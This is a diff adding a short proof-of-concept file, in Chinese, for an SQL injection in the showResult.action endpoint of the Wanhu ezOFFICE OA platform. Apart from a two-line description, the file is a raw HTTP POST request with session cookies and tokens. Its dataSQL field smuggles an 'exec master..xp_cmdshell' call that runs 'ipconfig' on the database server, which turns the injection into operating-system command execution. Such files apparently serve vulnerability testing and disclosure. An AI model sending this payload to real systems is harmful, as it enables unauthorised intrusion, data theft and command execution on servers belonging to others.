@@ -1,0 +1,11 @@
+# 万户OA showResult.action 后台SQL注入漏洞
+# 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。万户OA showResult.action 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息
+POST /defaultroot/Graph!showResult.action?acid=80051427&bid=hd_tag_m8mv23r4 HTTP/1.1
+Host: www.swaf.com
+Cookie: OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; LocLan=zh_CN; JSESSIONID=5AC1D44965A277C90D94B57DEDA82992; OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserName=dsfssaq; ezofficeUserPortal=; ezofficePortal135=1
+RM-PRO-BusinessID: hd_tag_m8mv23r4
+RM-PRO-Token: 20d8ea756e7d328469f4e502d2128ebc
+RM-PRO-Time: 1742808338769
+User-Agent: curl/7.83.1
+
+database=localDataSource&dataSQL=exec+master..xp_cmdshell+"ipconfig";
